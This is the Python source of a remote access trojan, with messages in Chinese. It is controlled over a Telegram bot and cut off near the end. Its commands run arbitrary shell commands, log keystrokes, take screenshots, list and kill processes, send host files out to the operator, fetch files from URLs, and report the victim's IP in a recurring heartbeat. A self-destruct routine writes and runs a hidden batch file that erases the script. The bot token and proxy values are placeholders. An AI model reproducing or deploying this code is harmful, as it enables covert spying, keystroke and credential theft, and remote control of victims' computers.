import os
import subprocess
import time
import requests
import telebot
from telebot import apihelper, types # Import types for potential future use
import platform
import threading
import pyautogui
from pynput import keyboard
import psutil
import tempfile
import uuid
from functools import wraps
import io # Needed for screenshot bytes handling
import socket # Needed for netstat proto check
import getpass # Needed for getuser fallback

# --- Configuration ---
# Telegram Bot Token (Replace with your actual token)
TOKEN = 'YOUR_BOT_TOKEN' # <<< 已替换为占位符
# Target Chat ID for notifications and heartbeat (Replace with your actual chat ID)
HEARTBEAT_CHAT_ID = 'YOUR_CHAT_ID' # <<< 已替换为占位符
# Default heartbeat update interval in seconds
DEFAULT_HEARTBEAT_INTERVAL = 60
# File size limit for uploads (Telegram API limit)
MAX_FILE_SIZE = 50 * 1024 * 1024  # 50MB in bytes
# Default CMD encoding for Windows
CMD_DEFAULT_ENCODING = 'gbk' # Often 'gbk' is more compatible on Chinese Windows for cmd output
# SOCKS5 Proxy Configuration (Set to None if no proxy is needed)
PROXY_CONFIG = {
   'https': 'socks5h://YOUR_PROXY_USER:YOUR_PROXY_PASSWORD@YOUR_PROXY_IP:YOUR_PROXY_PORT', # <<< 已替换为占位符
   'http': 'socks5h://YOUR_PROXY_USER:YOUR_PROXY_PASSWORD@YOUR_PROXY_IP:YOUR_PROXY_PORT' # <<< 已替换为占位符
}
# Set to None if no proxy is needed
# PROXY_CONFIG = None
# --- End Configuration ---

# --- Global State (Use with care) ---
machine_id = None
cmd_encoding = CMD_DEFAULT_ENCODING
# Heartbeat state
heartbeat_message_id = None
heartbeat_interval = DEFAULT_HEARTBEAT_INTERVAL
heartbeat_thread = None
heartbeat_stop_event = threading.Event() # Use event for cleaner thread stopping
# Keylogger state
keylog_active = False
keylog_buffer = []
keyboard_listener = None

# --- Initialize Bot ---
if PROXY_CONFIG:
    apihelper.proxy = PROXY_CONFIG
bot = telebot.TeleBot(TOKEN)

# --- Decorators ---
def command_error_handler(func):
    """Decorator to catch exceptions in command handlers and reply with an error."""
    @wraps(func)
    def wrapper(message, *args, **kwargs):
        try:
            return func(message, *args, **kwargs)
        except Exception as e:
            error_msg = f"执行命令 '{message.text.split()[0]}' 时出错: {e}"
            try:
                bot.reply_to(message, f"❌ 执行出错: {e}")
            except Exception as reply_e:
                pass
    return wrapper

# --- Helper Functions ---
def generate_machine_id():
    """Generates a unique machine identifier based on system info."""
    try:
        system = platform.system() or "UnknownSystem"
        machine = platform.machine() or "UnknownMachine"
        # processor = platform.processor() or "UnknownProcessor" # Processor can be less stable/unique
        # Use node name (hostname) for potentially better uniqueness across VMs/identical hardware
        node = platform.node() or "UnknownNode"
        hardware_info = f"{system}-{node}-{machine}"
        return str(uuid.uuid5(uuid.NAMESPACE_DNS, hardware_info))
    except Exception as e:
        return str(uuid.uuid4())

def generate_random_filename(extension):
    """Generates a random filename with the given extension."""
    return f"{uuid.uuid4()}{extension}"

def get_temp_file_path(filename):
    """Gets the full path for a file in the system's temp directory."""
    return os.path.join(tempfile.gettempdir(), filename)

def get_ip_info():
    """Fetches public IP information."""
    try:
        # Using a different service potentially more reliable
        response = requests.get('https://ipinfo.io/json', timeout=10)
        response.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx)
        data = response.json()
        # Handle potential missing keys gracefully
        ip = data.get('ip', 'N/A')
        city = data.get('city', 'N/A')
        region = data.get('region', 'N/A')
        country = data.get('country', 'N/A')
        org = data.get('org', 'N/A')
        timezone = data.get('timezone', 'N/A')
        return (f"公网IP: {ip}\n"
                f"位置: {city}, {region}, {country}\n"
                f"组织: {org}\n"
                f"时区: {timezone}")
    except requests.exceptions.RequestException as e:
        return "无法获取IP信息"
    except Exception as e:
        return "处理IP信息时出错"

def get_system_info():
    """Gathers basic system information."""
    global machine_id
    if machine_id is None:
        machine_id = generate_machine_id()
    try:
        system = platform.system()
        release = platform.release()
        version = platform.version()
        machine = platform.machine()
        try:
            username = os.getlogin()
        except OSError: # os.getlogin() might fail in some environments (e.g., no controlling tty)
            username = getpass.getuser() # Use getpass as a fallback

        return (f"上线时间: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())}\n"
                f"用户名: {username}\n"
                f"系统: {system} {release}\n"
                # f"版本号: {version}\n" # Version can be very long, maybe omit
                f"架构: {machine}\n"
                f"机器编码: {machine_id}")
    except Exception as e:
        return "无法获取系统信息"

def send_temp_file(chat_id, data, filename_base, extension, send_as='document', caption=None):
    """Creates a temporary file, sends it, and deletes it."""
    temp_file_path = None
    try:
        random_filename = generate_random_filename(extension)
        temp_file_path = get_temp_file_path(random_filename)

        mode = 'wb' if isinstance(data, bytes) else 'w'
        encoding = None if isinstance(data, bytes) else 'utf-8'

        with open(temp_file_path, mode, encoding=encoding) as f:
            f.write(data)

        with open(temp_file_path, 'rb') as f:
            if send_as == 'photo':
                bot.send_photo(chat_id, f, caption=caption)
            else: # Default to document
                bot.send_document(chat_id, f, caption=caption)

    except Exception as e:
        raise # Re-raise the exception to be caught by the command handler decorator
    finally:
        if temp_file_path and os.path.exists(temp_file_path):
            try:
                os.remove(temp_file_path)
            except OSError:
                pass

# --- Heartbeat Functions ---
def update_heartbeat_message():
    """Periodically updates the heartbeat message in the target chat."""
    global heartbeat_message_id

    while not heartbeat_stop_event.is_set():
        # Wait for the interval OR until the stop event is set
        # This makes stopping the thread much faster
        if heartbeat_stop_event.wait(timeout=heartbeat_interval):
             break # Stop event was set

        # If message ID is None, the initial message failed or was deleted.
        # Try to resend the initial message here if needed, or rely on the command handler.
        # For simplicity, we'll skip the update if message_id is None and let the command handle resending.
        if heartbeat_message_id is None:
             continue

        try:
            current_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
            # Only fetch IP if needed, could be less frequent if IP is static
            ip_info = get_ip_info()
            # Include Machine ID in heartbeat for easy identification
            new_text = (f"❤️ **在线** @ {current_time}\n"
                        f"{ip_info}\n"
                        f"机器编码: {machine_id}")

            # Ensure the message ID is valid before attempting to edit
            if heartbeat_message_id is not None:
                bot.edit_message_text(new_text, HEARTBEAT_CHAT_ID, heartbeat_message_id)

        except telebot.apihelper.ApiTelegramException as e:
            # Handle specific errors like message not found (if deleted manually)
            if "message to edit not found" in str(e):
                heartbeat_message_id = None # Reset ID
                # The start_heartbeat command will need to be re-run or
                # modified to auto-restart the initial message if it fails.
            else:
                # Log or handle other API errors. Wait before retrying.
                time.sleep(10) # Wait longer after API errors
        except Exception as e:
            # Handle other potential errors during update. Wait before retrying.
            time.sleep(10) # Wait longer after unknown errors

def stop_heartbeat_thread():
    """Stops the existing heartbeat thread gracefully."""
    global heartbeat_thread
    if heartbeat_thread and heartbeat_thread.is_alive():
        heartbeat_stop_event.set()
        heartbeat_thread.join(timeout=5) # Wait for thread to finish
        heartbeat_thread = None
        heartbeat_stop_event.clear() # Reset event for next start


def start_heartbeat():
    """Starts or restarts the heartbeat message and update thread."""
    global heartbeat_message_id, heartbeat_thread, heartbeat_interval

    stop_heartbeat_thread() # Ensure any previous thread is stopped

    initial_text = (f"⏳ 正在初始化心跳...\n"
                    f"{get_ip_info()}\n"
                    f"机器编码: {machine_id}")
    try:
        msg = bot.send_message(HEARTBEAT_CHAT_ID, initial_text)
        heartbeat_message_id = msg.message_id

        # Start the new heartbeat thread
        heartbeat_thread = threading.Thread(target=update_heartbeat_message, name='heartbeat_thread')
        heartbeat_thread.daemon = True # Allow program exit even if thread is running
        heartbeat_thread.start()

    except Exception as e:
        # Log the error if sending initial message fails
        # print(f"Error sending initial heartbeat message: {e}")
        heartbeat_message_id = None # Ensure ID is None if send failed


# --- Keylogger Functions ---
def on_key_press(key):
    """Callback function for the keyboard listener."""
    global keylog_buffer
    try:
        # Check if listener is still supposed to be active
        if not keylog_active:
            return False # Stop the listener

        # Append character or special key name
        key_str = key.char if hasattr(key, 'char') else f"[{key.name}]"
        keylog_buffer.append(key_str)

    except Exception:
        # Potentially stop listener if errors persist? For now, just log.
        pass

def start_keylogger():
    """Starts the keyboard listener."""
    global keylog_active, keylog_buffer, keyboard_listener
    if keylog_active:
        return False # Indicate already running

    keylog_buffer = [] # Clear previous buffer
    try:
        # Use non-blocking listener if possible, or run in a separate thread
        # pynput's default Listener runs in its own thread.
        keyboard_listener = keyboard.Listener(on_press=on_key_press)
        keyboard_listener.start() # Starts the listener thread
        keylog_active = True
        return True
    except Exception:
        keylog_active = False
        keyboard_listener = None
        return False

def stop_keylogger():
    """Stops the keyboard listener."""
    global keylog_active, keyboard_listener
    if not keylog_active or not keyboard_listener:
        return False # Indicate not running

    try:
        keylog_active = False # Signal callback to stop processing
        # pynput listener needs explicit stop
        keyboard_listener.stop()
        # Listener thread might take a moment to exit, joining is safer
        # keyboard_listener.join(timeout=2) # Optional: wait for thread exit
        keyboard_listener = None
        return True
    except Exception:
        # State might be inconsistent here, but log the error
        keylog_active = False # Ensure active is False even if stop failed
        keyboard_listener = None
        return False

# --- Bot Command Handlers ---
@bot.message_handler(commands=['start', 'help'])
@command_error_handler
def handle_start_help(message):
    help_text = """
    可用命令:
    /help - 显示此帮助信息
    /info - 显示系统和IP信息
    /cmd <命令> - 执行 Shell 命令 (使用 /system encoding 更改编码)
    /system encoding <编码> - 设置CMD命令输出编码 (例如: gbk, utf-8)
    /screenshot - 截取屏幕截图并发送
    /ps - 列出当前进程并发送文件
    /kill <PID> - 终止指定ID的进程
    /netstat - 显示网络连接并发送文件
    /search <文件名> <目录> - 在指定目录递归搜索文件
    /download <文件路径> - 下载服务器上的文件发送到TG
    /upload <文件URL> - (未实现安全下载) 从URL下载文件到服务器 (请谨慎使用!)
    /keylog [start|stop|dump] - 控制键盘记录器
    /heartbeat [间隔秒数] - 重置心跳消息并设置更新间隔 (默认60s)
    /selfdestruct confirm - **危险!** 尝试删除此脚本文件 (可能不完全可靠)
    /ipconfig [all] - 执行ipconfig命令并返回网络配置信息
    """
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['info'])
@command_error_handler
def handle_info(message):
    """Sends system and IP information."""
    ip_info = get_ip_info()
    system_info = get_system_info()
    message_content = f"🖥️ **系统信息**\n{system_info}\n\n🌐 **网络信息**\n{ip_info}"
    bot.reply_to(message, message_content)

@bot.message_handler(commands=['system'])
@command_error_handler
def handle_system(message):
    """Handles system-related settings, currently only CMD encoding."""
    global cmd_encoding
    args = message.text.split(maxsplit=2) # Split into max 3 parts

    if len(args) < 2:
        bot.reply_to(message, "用法: /system encoding <编码>")
        return

    sub_command = args[1].lower()
    if sub_command == "encoding":
        if len(args) == 3:
            new_encoding = args[2].lower()
            try:
                # Test encoding validity
                "test".encode(new_encoding).decode(new_encoding)
                cmd_encoding = new_encoding
                bot.reply_to(message, f"✅ CMD 命令输出编码已设置为: {cmd_encoding}")
            except LookupError:
                bot.reply_to(message, f"❌ 无效的编码: {new_encoding}")
            except Exception as e:
                 bot.reply_to(message, f"❌ 测试编码时出错: {e}")
        else:
            bot.reply_to(message, f"当前 CMD 编码: {cmd_encoding}\n用法: /system encoding <编码>")
    else:
        bot.reply_to(message, f"无效的子命令 '{sub_command}'. 当前仅支持 'encoding'.")


@bot.message_handler(commands=['cmd'])
@command_error_handler
def handle_cmd(message):
    """Executes a shell command."""
    global cmd_encoding
    # Extract command text after '/cmd '
    command_text = message.text.split(maxsplit=1)[1] if len(message.text.split()) > 1 else None

    if not command_text:
        bot.reply_to(message, "请提供要执行的命令. 用法: /cmd <命令>")
        return

    try:
        # Use shell=True carefully. Consider security implications if input is untrusted.
        # Using 'cmd /c' is specific to Windows. For cross-platform, avoid shell=True or check platform.
        # Timeout added to prevent hanging processes
        result = subprocess.run(
            f"cmd /c {command_text}",
            shell=True,
            capture_output=True, # Captures both stdout and stderr
            text=True,           # Decode output as text
            encoding=cmd_encoding,
            errors='replace',    # Replace undecodable characters
            timeout=120          # Timeout in seconds (e.g., 2 minutes)
        )

        output = result.stdout if result.stdout else ""
        stderr = result.stderr if result.stderr else ""
        reply_text = ""

        if result.returncode == 0:
            reply_text = f"✅ 命令执行成功 (代码: 0):\n```\n{output.strip()}\n```"
            if stderr:
                 reply_text += f"\n\n⚠️ 标准错误输出:\n```\n{stderr.strip()}\n```"
        else:
            reply_text = f"❌ 命令执行失败 (代码: {result.returncode}):\n"
            if output:
                reply_text += f"标准输出:\n```\n{output.strip()}\n```\n"
            if stderr:
                 reply_text += f"标准错误:\n```\n{stderr.strip()}\n```"

        # Send potentially large output as a file if it exceeds Telegram's limit
        if len(reply_text.encode('utf-8')) > 4000: # Check byte length for Telegram API limit
            send_temp_file(message.chat.id, reply_text, "cmd_output", ".txt")
            bot.reply_to(message, "✅ 命令输出过长,已作为文件发送.")
        else:
             bot.reply_to(message, reply_text, parse_mode="Markdown") # Use Markdown for ```

    except subprocess.TimeoutExpired:
         bot.reply_to(message, f"❌ 命令执行超时 (超过 120 秒).")
    except UnicodeDecodeError as e:
         bot.reply_to(message, f"❌ 命令输出解码错误.\n当前编码: {cmd_encoding} (尝试使用 /system encoding gbk 或 utf-8 更改).\n错误详情: {e}")
    except FileNotFoundError: # If 'cmd' itself is not found (unlikely on Windows)
        bot.reply_to(message,"❌ 无法找到命令解释器 'cmd'.")
    # General exception handling is now done by the decorator


@bot.message_handler(commands=['heartbeat'])
@command_error_handler
def handle_heartbeat(message):
    """Restarts the heartbeat with an optional new interval."""
    global heartbeat_interval

    args = message.text.split()
    new_interval = DEFAULT_HEARTBEAT_INTERVAL
    if len(args) > 1:
        try:
            interval_input = int(args[1])
            if interval_input >= 10: # Set a minimum reasonable interval
                 new_interval = interval_input
            else:
                 bot.reply_to(message, "⚠️ 间隔时间过短,请设置至少10秒.使用默认值.")
        except ValueError:
            bot.reply_to(message, f"无效的间隔时间 '{args[1]}'.使用默认值 {DEFAULT_HEARTBEAT_INTERVAL} 秒.")

    heartbeat_interval = new_interval

    # Delete the old message if it exists (best effort)
    if heartbeat_message_id:
        try:
            bot.delete_message(HEARTBEAT_CHAT_ID, heartbeat_message_id)
        except Exception:
            pass
        heartbeat_message_id = None # Reset ID regardless

    # Start the heartbeat process (sends new message, starts thread)
    start_heartbeat()

    bot.reply_to(message, f"❤️ 心跳已重置/启动,更新间隔: {heartbeat_interval} 秒.")


@bot.message_handler(commands=['search'])
@command_error_handler
def handle_search(message):
    """Recursively searches for a file in a directory."""
    args = message.text.split(maxsplit=2)
    if len(args) < 3:
        bot.reply_to(message, "用法: /search <文件名> <文件夹路径>")
        return

    filename_to_search = args[1]
    search_folder = args[2]

    if not os.path.isdir(search_folder):
        bot.reply_to(message, f"❌ 错误: 目录 '{search_folder}' 不存在或不是一个目录.")
        return

    found_files = []
    try:
        for root, dirs, files in os.walk(search_folder):
            # Prevent traversing special directories or endless loops (optional)
            # For example, skip system directories on Windows if needed

            if filename_to_search in files:
                full_path = os.path.join(root, filename_to_search)
                found_files.append(full_path)
    except Exception as e:
        bot.reply_to(message, f"❌ 搜索过程中发生错误: {e}")
        return

    if found_files:
        result_text = f"✅ 在 '{search_folder}' 中找到以下文件:\n" + "\n".join(found_files)
        # Send as file if too long
        if len(result_text.encode('utf-8')) > 4000: # Check byte length
            send_temp_file(message.chat.id, result_text, "search_results", ".txt")
            bot.reply_to(message, "搜索结果过长,已作为文件发送.")
        else:
            bot.reply_to(message, result_text)
    else:
        bot.reply_to(message, f"ℹ️ 在 '{search_folder}' 及其子目录中未找到文件: '{filename_to_search}'")

@bot.message_handler(commands=['upload'])
@command_error_handler
def handle_upload(message):
    """Downloads a file from a URL to the server's current directory."""
    args = message.text.split(maxsplit=1)
    if len(args) != 2:
        bot.reply_to(message, "用法: /upload <文件URL>\n**警告:** 此命令会将文件下载到脚本运行目录,请谨慎使用,确保URL可信!")
        return

    file_url = args[1]
    # Basic validation of URL structure (not foolproof)
    if not file_url.startswith(('http://', 'https://')):
         bot.reply_to(message, "❌ 无效的URL格式,请提供 http:// 或 https:// 开头的链接.")
         return

    # Derive filename from URL path, sanitize it
    try:
        # Get part before query string, then sanitize
        filename = os.path.basename(requests.utils.urlparse(file_url).path)
        # Very basic sanitization: keep alphanumeric, '.', '_', '-'
        filename = "".join(c for c in filename if c.isalnum() or c in ('.', '_', '-')).strip()
        if not filename: # Handle empty filename after sanitization
             filename = f"downloaded_{uuid.uuid4().hex[:8]}.file"
    except Exception:
         filename = f"downloaded_{uuid.uuid4().hex[:8]}.file"

    # Prevent directory traversal in the filename
    filename = os.path.basename(filename)

    download_path = os.path.join(os.getcwd(), filename) # Download to current working directory

    # Check if file already exists and avoid overwriting (optional, but safer)
    # if os.path.exists(download_path):
    #      bot.reply_to(message, f"文件 `{filename}` 已存在,取消下载.")
    #      return


    bot.reply_to(message, f"⏳ 正在尝试从 URL 下载文件到服务器: `{filename}`...")

    try:
        # Set a reasonable timeout for the entire download process
        response = requests.get(file_url, stream=True, timeout=180) # Use stream=True for large files, increased timeout
        response.raise_for_status() # Check for HTTP errors

        bytes_written = 0
        # Optional: Get Content-Length to estimate size and prevent huge downloads
        content_length = response.headers.get('content-length')
        if content_length and int(content_length) > MAX_FILE_SIZE:
             bot.reply_to(message, f"❌ 文件太大 ({int(content_length) / 1024 / 1024:.2f} MB),无法下载 (最大 {MAX_FILE_SIZE / 1024 / 1024} MB).")
             response.close() # Close the connection
             return


        with open(download_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192): # Process in chunks
                if chunk: # filter out keep-alive new chunks
                    f.write(chunk)
                    bytes_written += len(chunk)
                    # Optional: Add progress update here if needed

        bot.reply_to(message, f"✅ 文件 `{filename}` ({bytes_written / 1024 / 1024:.2f} MB) 下载成功.")

    except requests.exceptions.Timeout:
        bot.reply_to(message, f"❌ 从URL下载文件超时.")
    except requests.exceptions.RequestException as e:
        bot.reply_to(message, f"❌ 从URL下载文件时出错: {e}")
    except OSError as e:
        bot.reply_to(message, f"❌ 写入文件到服务器时出错: {e}")
    # Decorator handles other exceptions
    finally:
        # Ensure response connection is closed
        if 'response' in locals() and response:
            response.close()


@bot.message_handler(commands=['download'])
@command_error_handler
def handle_download(message):
    """Downloads a local file from the server and sends it to Telegram."""
    args = message.text.split(maxsplit=1)
    if len(args) != 2:
        bot.reply_to(message, "用法: /download <服务器上的文件路径>")
        return

    file_path = args[1]

    # Normalize path to prevent directory traversal issues (optional but recommended)
    try:
        file_path = os.path.abspath(file_path)
        # Add a check to ensure the path is within expected boundaries if possible
        # E.g., check if it's inside the script's directory or a designated download folder
    except ValueError: # handle invalid path format
         bot.reply_to(message, f"❌ 无效的文件路径格式: `{file_path}`")
         return


    if not os.path.exists(file_path):
        bot.reply_to(message, f"❌ 文件不存在: `{file_path}`")
        return
    if not os.path.isfile(file_path):
        bot.reply_to(message, f"❌ 路径不是一个文件: `{file_path}`")
        return

    try:
        file_size = os.path.getsize(file_path)
        if file_size > MAX_FILE_SIZE:
            bot.reply_to(message, f"❌ 文件太大 ({file_size / 1024 / 1024:.2f} MB),无法发送 (最大 {MAX_FILE_SIZE / 1024 / 1024} MB).")
            return

        file_size_mb = file_size / 1024 / 1024
        bot.reply_to(message, f"⏳ 正在准备发送文件: `{os.path.basename(file_path)}` ({file_size_mb:.2f} MB)...")

        with open(file_path, 'rb') as f:
            bot.send_document(message.chat.id, f, caption=os.path.basename(file_path))
        # bot.reply_to(message, f"✅ 文件 `{os.path.basename(file_path)}` 发送成功.") # send_document is confirmation enough

    except OSError as e:
         bot.reply_to(message, f"❌ 读取文件时出错: {e}")
    # Decorator handles other exceptions (like Telegram API errors during send)


@bot.message_handler(commands=['screenshot'])
@command_error_handler
def handle_screenshot(message):
    """Takes a screenshot and sends it."""
    bot.reply_to(message, "⏳ 正在截取屏幕...")
    try:
        # Use the helper function
        screenshot = pyautogui.screenshot()
        # Convert PIL Image to bytes
        img_byte_arr = io.BytesIO()
        screenshot.save(img_byte_arr, format='PNG')
        img_byte_arr = img_byte_arr.getvalue()

        send_temp_file(message.chat.id, img_byte_arr, "screenshot", ".png", send_as='photo')
        # bot.reply_to(message, "✅ 截图已发送.") # Sending the photo is confirmation
    except Exception as e:
        # Handle potential exceptions during screenshot or sending
        bot.reply_to(message, f"❌ 截取或发送截图时出错: {e}")


@bot.message_handler(commands=['keylog'])
@command_error_handler
def handle_keylog(message):
    """Controls the keyboard logger."""
    global keylog_buffer # Only need buffer here, start/stop manage state
    args = message.text.split(maxsplit=1)
    action = args[1].lower() if len(args) > 1 else None

    if action == "start":
        if start_keylogger():
            bot.reply_to(message, "✅ 键盘记录已启动.")
        else:
            bot.reply_to(message, "⚠️ 键盘记录已在运行或启动失败.")
    elif action == "stop":
        if stop_keylogger():
            bot.reply_to(message, "✅ 键盘记录已停止.")
        else:
            bot.reply_to(message, "⚠️ 键盘记录未在运行或停止失败.")
    elif action == "dump":
        if not keylog_active and not keylog_buffer:
             bot.reply_to(message, "ℹ️ 键盘记录器未运行且缓冲区为空.")
             return

        if keylog_buffer:
            log_text = ''.join(keylog_buffer)
            keylog_buffer = [] # Clear buffer after dumping
            # Send as file if too long
            if len(log_text.encode('utf-8')) > 4000: # Check byte length
                send_temp_file(message.chat.id, log_text, "keylog_dump", ".txt")
                bot.reply_to(message, "✅ 键盘记录内容已转储并作为文件发送.")
            else:
                bot.reply_to(message, f"⌨️ 键盘记录内容:\n```\n{log_text}\n```", parse_mode="Markdown")
        else:
            bot.reply_to(message, "ℹ️ 键盘记录缓冲区为空.")
    else:
        status = "运行中" if keylog_active else "已停止"
        buf_size = len(keylog_buffer)
        bot.reply_to(message, f"用法: /keylog [start|stop|dump]\n当前状态: {status}\n缓冲区大小: {buf_size} 键")

@bot.message_handler(commands=['ps'])
@command_error_handler
def handle_process_list(message):
    """Gets the process list and sends it as a file."""
    bot.reply_to(message, "⏳ 正在获取进程列表...")
    process_data = "PID    | Status     | User            | Name\n"
    process_data += "-------|------------|-----------------|------------\n"
    try:
        # Iterate efficiently, getting only needed attributes
        for proc in psutil.process_iter(['pid', 'name', 'username', 'status']):
             try:
                 # Handle potential AccessDenied or zombie processes gracefully
                 proc_info = proc.info
                 # Filter out None usernames if needed, format nicely
                 username = proc_info.get('username') or 'N/A'
                 status = proc_info.get('status', 'N/A')
                 # Ensure strings for formatting
                 process_data += (f"{str(proc_info['pid']):<6} | "
                                  f"{str(status):<10} | "
                                  f"{str(username):<15} | "
                                  f"{str(proc_info['name'])}\n")
             except (psutil.NoSuchProcess, psutil.AccessDenied):
                 continue # Skip processes that disappeared or we can't access
    except Exception as e:
         # Continue trying to send whatever data was gathered
         process_data += f"\n\n错误: 迭代进程时发生错误: {e}"

    if len(process_data.splitlines()) <= 2: # Check if only header and separator exist
         bot.reply_to(message,"❌ 未能获取任何进程信息或列表为空.")
         return

    send_temp_file(message.chat.id, process_data, "process_list", ".txt")
    # bot.reply_to(message, "✅ 进程列表已作为文件发送.") # File send is confirmation

@bot.message_handler(commands=['kill'])
@command_error_handler
def handle_kill_process(message):
    """Terminates a process by its PID."""
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "用法: /kill <进程ID>")
        return

    try:
        pid = int(args[1])
        if pid <= 1: # Basic sanity check for system processes
             bot.reply_to(message, "❌ 不能终止系统关键进程 (PID <= 1).")
             return

        process = psutil.Process(pid)
        process_name = process.name()
        process.terminate() # Sends SIGTERM (graceful shutdown)
        # Optionally wait a bit and send SIGKILL if still alive:
        # process.kill() # Sends SIGKILL (force kill)

        bot.reply_to(message, f"✅ 已发送终止信号给进程 {pid} ({process_name}).")

    except ValueError:
        bot.reply_to(message, f"❌ 无效的进程ID: '{args[1]}'. 请输入数字.")
    except psutil.NoSuchProcess:
        bot.reply_to(message, f"❌ 进程 {pid} 不存在.")
    except psutil.AccessDenied:
         bot.reply_to(message, f"❌ 无权限终止进程 {pid}.")
    # Decorator handles other exceptions


@bot.message_handler(commands=['netstat'])
@command_error_handler
def handle_netstat(message):
    """Gets network connections and sends them as a file."""
    bot.reply_to(message, "⏳ 正在获取网络连接...")
    net_data = "Proto Local Address           Foreign Address         Status        PID   Process Name\n"
    net_data += "="*80 + "\n" # Adjusted separator length
    try:
        # Get connections with associated PIDs
        # psutil.net_connections() provides details including pid
        connections = psutil.net_connections(kind='inet') # inet4 and inet6

        # Optional: Get process names efficiently
        # Instead of getting all process names upfront, look them up per connection
        # This avoids large overhead if there are many processes but few connections
        proc_name_cache = {}
        def get_process_name(pid):
            if pid is None:
                return "N/A"
            if pid not in proc_name_cache:
                try:
                    proc = psutil.Process(pid)
                    # Add a timeout for getting process name to prevent hanging
                    proc_name_cache[pid] = proc.name() # Cache the name
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.TimeoutExpired):
                    proc_name_cache[pid] = "N/A" # Cache "N/A" on error
            return proc_name_cache[pid]


        for conn in connections:
            laddr = f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else "N/A"
            raddr = f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "N/A"
            status = conn.status
            pid = conn.pid
            pname = get_process_name(pid) # Use cached lookup

            # Basic formatting (can be improved)
            proto = "TCP" if conn.type == socket.SOCK_STREAM else "UDP" if conn.type == socket.SOCK_DGRAM else str(conn.type)

            # Ensure strings for formatting
            net_data += (f"{str(proto):<5} {str(laddr):<21} {str(raddr):<21} {str(status):<13} {str(pid or 'N/A'):<5} {str(pname)}\n")

    except Exception as e:
         net_data += f"\n\n错误: 获取网络连接时发生错误: {e}"

    if len(net_data.splitlines()) <= 2: # Check if only header and separator exist
         bot.reply_to(message,"ℹ️ 未找到活动的网络连接或获取信息失败.")
         return

    send_temp_file(message.chat.id, net_data, "netstat_output", ".txt")
    # bot.reply_to(message, "✅ 网络连接列表已作为文件发送.") # File send is confirmation

@bot.message_handler(commands=['ipconfig'])
@command_error_handler
def handle_ipconfig(message):
    """Executes ipconfig (on Windows) and returns the output."""
    if platform.system() != "Windows":
        bot.reply_to(message, "❌ 此命令仅支持 Windows 系统.")
        return

    args = message.text.split()
    command = "ipconfig"
    if len(args) > 1 and args[1].lower() == "all":
        command = "ipconfig /all"

    bot.reply_to(message, f"⏳ 正在执行命令: `{command}`...")

    try:
        result = subprocess.run(
            command,
            shell=True, # ipconfig might need shell to run
            capture_output=True,
            text=True,
            encoding=cmd_encoding, # Use configured encoding
            errors='replace',
            timeout=30 # Shorter timeout for ipconfig
        )

        output = result.stdout if result.stdout else ""
        stderr = result.stderr if result.stderr else ""
        reply_text = ""

        if result.returncode == 0:
            reply_text = f"✅ 命令执行成功 (代码: 0):\n```\n{output.strip()}\n```"
            if stderr:
                 reply_text += f"\n\n⚠️ 标准错误输出:\n```\n{stderr.strip()}\n```"
        else:
            reply_text = f"❌ 命令执行失败 (代码: {result.returncode}):\n"
            if output:
                reply_text += f"标准输出:\n```\n{output.strip()}\n```\n"
            if stderr:
                 reply_text += f"标准错误:\n```\n{stderr.strip()}\n```"

        if len(reply_text.encode('utf-8')) > 4000: # Check byte length
             send_temp_file(message.chat.id, reply_text, "ipconfig_output", ".txt")
             bot.reply_to(message, "✅ IP 配置输出过长,已作为文件发送.")
        else:
             bot.reply_to(message, reply_text, parse_mode="Markdown")

    except subprocess.TimeoutExpired:
         bot.reply_to(message, f"❌ 命令执行超时 (超过 30 秒).")
    except FileNotFoundError:
        bot.reply_to(message,"❌ 无法找到命令 'ipconfig'.")
    except UnicodeDecodeError as e:
         bot.reply_to(message, f"❌ 命令输出解码错误.\n当前编码: {cmd_encoding} (尝试使用 /system encoding gbk 或 utf-8 更改).\n错误详情: {e}")


@bot.message_handler(commands=['selfdestruct'])
@command_error_handler
def handle_self_destruct(message):
    """尝试删除脚本文件并终止进程"""
    args = message.text.split()
    if len(args) == 2 and args[1].lower() == "confirm":
        bot.reply_to(message, "🚨 **警告!** 正在尝试执行自毁程序...")
        try:
            # 获取当前脚本的绝对路径
            script_path = os.path.abspath(__file__)

            # 停止所有线程和监听器
            stop_heartbeat_thread()
            stop_keylogger()

            # 等待线程完全停止 (给1-2秒时间)
            time.sleep(1.5)

            # 创建一个批处理文件来删除主脚本并终止进程
            batch_path = os.path.join(tempfile.gettempdir(), f"delete_{uuid.uuid4().hex[:8]}.bat")

            # 获取当前进程ID
            current_pid = os.getpid()

            # 创建批处理文件内容
            # timeout /t 延迟执行，给当前进程发送响应的时间
            # del /f /q 强制删除文件，不提示
            # taskkill /F /PID 强制终止指定进程ID
            # del /f /q "%~f0" 删除批处理文件自身
            batch_content = f"""@echo off
timeout /t 3 /nobreak > nul
del /f /q "{script_path}"
taskkill /F /PID {current_pid} > nul 2>&1
del /f /q "%~f0"
""" # Added nul 2>&1 to suppress taskkill output/errors

            # 写入批处理文件
            with open(batch_path, 'w') as f:
                f.write(batch_content)

            # 在后台执行批处理文件，不等待其完成
            # 使用 shell=True 是为了运行 .bat 文件
            # creationflags=subprocess.CREATE_NO_WINDOW 防止弹窗
            subprocess.Popen(['cmd', '/c', batch_path],
                            creationflags=subprocess.CREATE_NO_WINDOW,
                            shell=True)

            # 发送最后一条消息
            bot.reply_to(message, "✅ 自毁程序已启动,脚本将在几秒内被删除.")

            # 强制退出进程
            # 即使批处理文件失败，这个也会尝试立即退出
            os._exit(0)

        except Exception as e:
            error_msg = f"自毁失败: {e}"
            try:
                # Attempt to send the error message back
                bot.reply_to(message, f"❌ {error_msg}")
            except:
                # If even replying fails, just print to console (if running interactively)
                # print(f"Failed to reply with self-destruct error: {e}")
                pass
    else:
        bot.reply_to(message, "🚨 确认自毁? 此操作会尝试删除脚本文件并终止进程.\n使用: `/selfdestruct confirm` 来确认.")


# --- Main Execution Logic ---
def main_loop():
    """Main loop that handles bot polling and restarts on connection errors."""
    global machine_id
    machine_id = generate_machine_id() # Generate ID once at start

    # Initial startup message
    startup_info = get_system_info() + "\n\n" + get_ip_info()
    # Try sending startup message before polling starts
    try:
